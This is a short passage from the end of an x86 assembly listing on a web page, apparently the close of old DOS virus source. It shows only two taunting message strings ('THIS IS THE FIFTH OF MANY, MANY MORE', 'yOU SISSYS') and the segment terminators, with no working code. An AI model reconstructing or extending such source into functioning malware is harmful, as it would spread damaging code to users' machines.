WORDS3   DB   "  hr/sss nycITY, THIS IS THE FIFTH OF MANY, MANY MORE....",0
WORDS4   DB   "  yOU SISSYS.....",0

MAIN     ENDP
CODE     ENDS
         END      MAIN

</textarea></td></tr></table></body></html>
